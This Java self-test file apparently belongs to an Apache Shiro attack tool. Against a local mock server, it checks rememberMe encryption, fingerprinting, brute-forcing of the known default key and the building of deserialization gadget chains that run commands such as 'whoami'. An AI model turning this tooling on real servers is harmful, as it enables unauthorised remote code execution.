import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import shiro.ChainsEngine;
import shiro.ShiroEngine;
import shiro.ShiroExploit;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Shiro 模块自检：
 * 1) 加解密往返；2) 指纹识别；3) 密钥爆破；4) java-chains 链生成。
 *
 * <p>用一个本地模拟 Shiro 服务充当靶场：能正确解密的 rememberMe 不回写 deleteMe，
 * 解密失败的会回写 Set-Cookie: rememberMe=deleteMe，与真实 Shiro 行为一致。
 *
 * 用法：java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
 *              --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED
 *              -cp target\classes ShiroCheck
 */
public final class ShiroCheck {

    private static final String GOOD_KEY = "kPH+bIxk5D2deZiIxcaaaA==";
    private static final String BAD_KEY = "MTIzNDU2Nzg5MGFiY2RlZg==";

    public static void main(String[] args) throws Exception {
        // 链生成会真实执行 Exec 节点里的命令：自检退出时把弹出的计算器进程收掉
        TestProcessGuard.install("ShiroCheck");
        cryptoRoundTrip();
        headerParsing();
        detectAndCrack();
        chainsBuild();
        System.out.println("Shiro 模块自检通过");
        System.exit(0);
    }

    private static void cryptoRoundTrip() {
        byte[] plain = ShiroEngine.serializeEmptyPrincipal();
        check("空身份集合可序列化", plain.length > 0);

        byte[] cbc = ShiroEngine.encrypt(plain, GOOD_KEY, false);
        check("CBC 加密成功", cbc != null && cbc.length > 0);
        byte[] decryptedCbc = ShiroEngine.decrypt(cbc, ShiroEngine.decodeBase64(GOOD_KEY), false);
        check("CBC 加解密往返一致", Arrays.equals(plain, decryptedCbc));

        byte[] gcm = ShiroEngine.encrypt(plain, GOOD_KEY, true);
        check("GCM 加密成功", gcm != null && gcm.length > 16);
        byte[] decryptedGcm = ShiroEngine.decrypt(gcm, ShiroEngine.decodeBase64(GOOD_KEY), true);
        check("GCM 加解密往返一致", Arrays.equals(plain, decryptedGcm));

        check("密钥长度校验拦截非法值", ShiroEngine.validateKey("abcd") != null);
        check("密钥长度校验通过合法值", ShiroEngine.validateKey(GOOD_KEY) == null);
        check("非 Base64 密钥被拦截", ShiroEngine.validateKey("!!!not-base64!!!") != null);
    }

    /**
     * 附加请求头的解析：一键发送依赖它把从抓包页带过来的会话 Cookie 交给目标。
     *
     * <p>两个关键点：同名头必须合并而不是互相覆盖（会话 Cookie + rememberMe 都要发出去），
     * 名字大小写不同也要视为同一个头（抓包里常见小写 cookie）。
     */
    private static void headerParsing() {
        java.util.Map<String, String> headers = ShiroEngine.parseHeaders(
                "Cookie: JWT_TOKEN=abc\nX-Trace: 1\ncookie: JSESSIONID=xyz\nHost: example.org");
        check("\u9644\u52a0\u8bf7\u6c42\u5934\u6309\u884c\u89e3\u6790", headers.size() == 2);
        check("\u540c\u540d Cookie \u5408\u5e76\u800c\u4e0d\u662f\u4e92\u76f8\u8986\u76d6",
                "JWT_TOKEN=abc; JSESSIONID=xyz".equals(headers.get("Cookie")));
        check("\u5927\u5c0f\u5199\u4e0d\u540c\u7684\u540c\u540d\u5934\u89c6\u4e3a\u540c\u4e00\u4e2a\u5934", headers.get("Cookie") != null);
        check("\u666e\u901a\u5934\u539f\u6837\u4fdd\u7559", "1".equals(headers.get("X-Trace")));
        check("Host \u7531\u76ee\u6807 URL \u51b3\u5b9a\uff0c\u4e0d\u7167\u642c\u6293\u5305\u91cc\u7684\u503c",
                headers.get("Host") == null);
        check("\u7a7a\u884c\u4e0e\u6ce8\u91ca\u88ab\u5ffd\u7565",
                ShiroEngine.parseHeaders("\n# \u6ce8\u91ca\n\n").isEmpty());

        // \u6293\u5305\u9875\u7684 cookie-header \u8f6c\u6362\u76ee\u6807\u5bfc\u51fa\u7684\u662f\u88f8 Cookie\uff1a
        // \u6ca1\u6709 Key: Value \u7ed3\u6784\uff0c\u65e7\u903b\u8f91\u4f1a\u6574\u884c\u4e22\u5f03\uff0c\u767b\u5f55\u6001\u5c31\u53d1\u4e0d\u51fa\u53bb
        java.util.Map<String, String> raw = ShiroEngine.parseHeaders(
                "JWT_TOKEN=abc.def; JSESSIONID=xyz");
        check("\u88f8 Cookie \u503c\u88ab\u5f52\u5165 Cookie \u5934",
                ("JWT_TOKEN=abc.def; JSESSIONID=xyz").equals(raw.get("Cookie")));
        check("\u88f8 Cookie \u4e0d\u4f1a\u88ab\u5f53\u6210\u8bf7\u6c42\u5934\u540d", raw.size() == 1);

        java.util.Map<String, String> swapped = ShiroEngine.parseHeaders(
                "Cookie: JWT_TOKEN=abc\nJWT_TOKEN=abc.def; JSESSIONID=xyz");
        check("\u8bf7\u6c42\u5934\u4e0e\u88f8 Cookie \u6df7\u7528\u65f6\u4e00\u5e76\u5408\u5e76\u5230 Cookie",
                swapped.get("Cookie") != null
                        && swapped.get("Cookie").contains("JWT_TOKEN=abc")
                        && swapped.get("Cookie").contains("JSESSIONID=xyz"));

        java.util.Map<String, String> guarded = ShiroEngine.parseHeaders(
                "Content-Length: 9999\nAccept-Encoding: gzip, deflate\nProxy-Connection: keep-alive\n"
                        + "Cookie: JWT_TOKEN=abc");
        check("\u8fc7\u671f Content-Length \u4e0d\u4f1a\u88ab\u7167\u642c\u53d1\u51fa\u53bb", guarded.get("Content-Length") == null);
        check("\u58f0\u660e gzip \u7684 Accept-Encoding \u4e0d\u4f1a\u88ab\u7167\u642c\u53d1\u51fa\u53bb", guarded.get("Accept-Encoding") == null);
        check("\u8df3\u8f6c\u5934 Proxy-Connection \u4e0d\u4f1a\u88ab\u7167\u642c\u53d1\u51fa\u53bb", guarded.get("Proxy-Connection") == null);
        check("\u4e1a\u52a1\u5934 Cookie \u4ecd\u7136\u4fdd\u7559", "JWT_TOKEN=abc".equals(guarded.get("Cookie")));
    }

    private static void detectAndCrack() throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        final java.util.List<String> seenCookies =
                java.util.Collections.synchronizedList(new ArrayList<String>());
        server.createContext("/", new MockShiroHandler(seenCookies));
        server.start();
        int port = server.getAddress().getPort();
        try {
            ShiroEngine.Options options = new ShiroEngine.Options();
            options.url = "http://127.0.0.1:" + port + "/index";
            options.method = "GET";
            options.timeoutSeconds = 5;
            // 模拟从抓包页带过来的登录态
            options.extraHeaders = "Cookie: JWT_TOKEN=session-from-capture";

            ShiroEngine.FingerprintResult fingerprint = ShiroEngine.detect(options);
            System.out.println("指纹识别: " + fingerprint.message);
            check("确认目标为 Shiro", fingerprint.shiroDetected);
            check("探测响应 deleteMe 计数高于基线", fingerprint.probeDeleteMe > fingerprint.baselineDeleteMe);
            check("可达性自检返回可达", ShiroEngine.probeReachability(options).startsWith("可达"));
            boolean sessionSentEverywhere = !seenCookies.isEmpty();
            boolean rememberMeMerged = false;
            for (String seen : seenCookies) {
                if (!seen.contains("JWT_TOKEN=session-from-capture")) sessionSentEverywhere = false;
                if (seen.contains("JWT_TOKEN=session-from-capture") && seen.contains("rememberMe=")) {
                    rememberMeMerged = true;
                }
            }
            check("基线请求也带上会话 Cookie（不会退化成一个无 Cookie 的探测）", sessionSentEverywhere);
            check("会话 Cookie 与 rememberMe 合并成同一个头，登录态不被覆盖", rememberMeMerged);

            List<String> keys = new ArrayList<String>();
            keys.add(BAD_KEY);
            keys.add("ZW5jcnlwdGlvbl9rZXlfMTIzNDU2Nzg=");
            keys.add(GOOD_KEY);
            AtomicBoolean cancel = new AtomicBoolean();
            final List<String> found = new ArrayList<String>();
            ShiroEngine.KeyResult result = ShiroEngine.crack(options, keys, false, fingerprint.probeDeleteMe, 3,
                    new ShiroEngine.CrackListener() {
                        public void onProgress(int tested, int total, String currentKey) {
                        }

                        public void onFound(String key, boolean gcm, int tested) {
                            found.add(key);
                        }
                    }, cancel);
            System.out.println("爆破结果: " + result.message);
            check("爆破命中正确密钥", result.matched && GOOD_KEY.equals(result.key));
            check("命中回调只触发一次", found.size() == 1);
            check("命中后置位中断标志", cancel.get());

            ShiroEngine.KeyResult wrong = ShiroEngine.checkKey(options, BAD_KEY, false, fingerprint.probeDeleteMe);
            check("错误密钥不会被判为命中", !wrong.matched);

            ShiroEngine.Options gcmOptions = options.copy();
            ShiroEngine.KeyResult gcmResult = ShiroEngine.crack(gcmOptions, Arrays.asList(BAD_KEY, GOOD_KEY), true,
                    ShiroEngine.detect(gcmOptions).probeDeleteMe, 2, null, new AtomicBoolean());
            check("GCM 模式同样可以爆破出密钥", gcmResult.matched);
        } finally {
            server.stop(0);
        }
    }

    private static void chainsBuild() {
        ChainsEngine.init();
        System.out.println("java-chains: " + ChainsEngine.statusMessage());
        check("java-chains 初始化完成", ChainsEngine.isReady());
        check("节点数量超过 400", ChainsEngine.nodeIds().size() > 400);
        check("内置 payload 列表含 shiropayload", ChainsEngine.payloadIds().contains("shiropayload"));
        check("可查询节点参数", !ChainsEngine.paramsOf("exec").isEmpty());
        check("可查询后续节点", ChainsEngine.nextNodes("templatesimpl").contains("bytecodeconvert"));
        check("预置链模板非空", !ChainsEngine.templates().isEmpty());

        List<String> chain = Arrays.asList("commonscollectionsk1", "templatesimpl", "bytecodeconvert", "tomcatecho");
        java.util.Map<String, String> params = ChainsEngine.defaultParams("shiropayload", false, GOOD_KEY, null);
        params.put("TomcatEcho.header", "X-Authorization");
        ChainsEngine.Generated generated = ChainsEngine.build("shiropayload", chain, ChainsEngine.normalizeParams(params));
        System.out.println("链生成: " + generated.message);
        check("Shiro 回显链生成成功", generated.success);
        check("生成的 payload 可被本机密钥解密",
                ShiroEngine.decrypt(ShiroEngine.decodeBase64(generated.payload),
                        ShiroEngine.decodeBase64(GOOD_KEY), false) != null);

        ChainsEngine.Generated nativeChain = ChainsEngine.build("javanativepayload",
                Arrays.asList("commonscollectionsk1", "templatesimpl", "bytecodeconvert", "exec"),
                ChainsEngine.normalizeParams(ChainsEngine.defaultParams("javanativepayload", false, GOOD_KEY, "whoami")));
        check("原生 Java 链同样可以生成", nativeChain.success);
        ChainsEngine.Generated broken = ChainsEngine.build("shiropayload", Arrays.asList("commonscollectionsk1"),
                new java.util.LinkedHashMap<String, Object>());
        check("非法链会被引擎拒绝并给出原因", !broken.success && !broken.message.isEmpty());

        List<ShiroExploit.ChainKind> kinds = Arrays.asList(ShiroExploit.ChainKind.values());
        check("提供 CB1 / CCK1 / CCK2 三种链", kinds.size() == 3);
        ShiroExploit exploit = new ShiroExploit(new ShiroEngine.Options(), GOOD_KEY, false, "X-Authorization");
        check("可生成回显链", exploit.buildEchoPayload(ShiroExploit.ChainKind.CCK1).success);
        check("可生成命令链", exploit.buildCommandPayload(ShiroExploit.ChainKind.CCK1, "whoami").success);
        check("响应回显提取会去掉标记行", "result-line".equals(ShiroExploit.extractEcho("inptrj\nresult-line\n")));
    }

    /** 模拟 Shiro：rememberMe 解不开就回写 deleteMe。 */
    private static final class MockShiroHandler implements HttpHandler {
        private final java.util.List<String> seenCookies;

        MockShiroHandler(java.util.List<String> seenCookies) {
            this.seenCookies = seenCookies;
        }

        @Override public void handle(HttpExchange exchange) throws IOException {
            String cookie = exchange.getRequestHeaders().getFirst("Cookie");
            if (cookie != null) seenCookies.add(cookie);
            String rememberMe = cookieValue(cookie, "rememberMe");
            boolean ok = rememberMe == null || decrypts(rememberMe);
            if (!ok) {
                exchange.getResponseHeaders().add("Set-Cookie",
                        "rememberMe=deleteMe; Path=/; Max-Age=0; HttpOnly");
            }
            byte[] body = ("{\"ok\":" + ok + "}").getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().add("Content-Type", "application/json");
            exchange.sendResponseHeaders(200, body.length);
            OutputStream output = exchange.getResponseBody();
            output.write(body);
            output.close();
        }

        private boolean decrypts(String value) {
            try {
                byte[] cipher = Base64.getDecoder().decode(value);
                byte[] key = ShiroEngine.decodeBase64(GOOD_KEY);
                return ShiroEngine.decrypt(cipher, key, false) != null
                        || ShiroEngine.decrypt(cipher, key, true) != null;
            } catch (IllegalArgumentException e) {
                return false;
            }
        }

        private String cookieValue(String header, String name) {
            if (header == null) return null;
            for (String part : header.split(";")) {
                String text = part.trim();
                int equals = text.indexOf('=');
                if (equals > 0 && text.substring(0, equals).trim().equals(name)) {
                    return text.substring(equals + 1).trim();
                }
            }
            return null;
        }
    }

    private static void check(String message, boolean condition) {
        if (!condition) {
            System.err.println("自检失败: " + message);
            System.exit(1);
        }
        System.out.println("  [ok] " + message);
    }
}
